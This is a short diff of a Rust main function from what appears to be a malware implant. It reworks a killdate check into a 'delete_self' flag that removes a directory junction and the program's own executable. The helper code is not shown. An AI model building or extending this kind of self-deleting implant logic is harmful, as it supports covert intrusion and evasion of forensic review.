@@ -35,11 +35,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         #[cfg(feature = "debug")]
         println!("[*] Starting browser...");
         match browser::run_browser(&junc_path).await {
-            Ok(is_past) => {
-                if is_past {
-                    #[cfg(feature = "debug")]
-                    println!("[*] Current date is past killdate.");
-
+            Ok(delete_self) => {
+                if delete_self {
                     #[cfg(feature = "debug")]
                     println!("[*] Removing junction and dir...");
                     junction::delete(&junc_path)?;
@@ -52,9 +49,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                     #[cfg(feature = "debug")]
                     println!("[*] Deleting self...");
                     let _ = selfdeletion::delete_self();
-                } else {
-                    #[cfg(feature = "debug")]
-                    println!("[*] Current date is not past killdate.");
                 }
             }
             Err(_e) => {
